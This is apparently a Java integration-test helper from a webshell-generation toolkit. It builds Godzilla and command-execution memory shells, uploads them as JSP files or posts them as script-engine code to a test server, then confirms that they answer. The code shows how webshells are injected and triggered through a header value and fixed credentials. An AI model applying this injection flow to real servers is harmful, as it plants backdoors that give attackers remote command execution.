package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.packer.Packer;
import lombok.extern.slf4j.Slf4j;

import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertionTool {
    public static void testShellInjectAssertOk(String url, Server server, String shellType, ShellTool shellTool, int targetJdkVersion, Packer.INSTANCE packer) {
        InjectorConfig injectorConfig = new InjectorConfig();

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJdkVersion(targetJdkVersion)
                .build();

        String shellUrl = url + "/test";
        switch (shellTool) {
            case Godzilla:
                String pass = "pass";
                String key = "key";
                String headerValue = "Godzilla" + shellType + packer.name();
                GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                        .pass(pass).key(key)
                        .headerName("User-Agent").headerValue(headerValue)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
                String godzillaContent = new String(Objects.requireNonNull(GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer)));
                assertInjectIsOk(url, shellType, shellTool, godzillaContent, packer);
                GodzillaShellTool.testIsOk(shellUrl, godzillaConfig);
                break;
            case Command:
                String paramName = "Command" + shellType + packer.name();
                CommandConfig commandConfig = CommandConfig.builder().paramName(paramName).build();
                String commandContent = new String(Objects.requireNonNull(GeneratorMain.generate(shellConfig, injectorConfig, commandConfig, packer)));
                log.info("generated {} command shell with paramName: {}", shellType, commandConfig.getParamName());
                assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                CommandShellTool.testIsOk(shellUrl, commandConfig);
        }
    }

    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
        if (Packer.INSTANCE.JSP.equals(packer)) {
            String uploadEntry = url + "/upload";
            String filename = shellType + shellTool + ".jsp";
            String shellUrl = url + "/" + filename;
            VulTool.uploadJspFileToServer(uploadEntry, filename, content);
            VulTool.urlIsOk(shellUrl);
        } else if (Packer.INSTANCE.ScriptEngine.equals(packer)) {
            String uploadEntry = url + "/js";
            VulTool.postJS(uploadEntry, content);
        }
    }
}
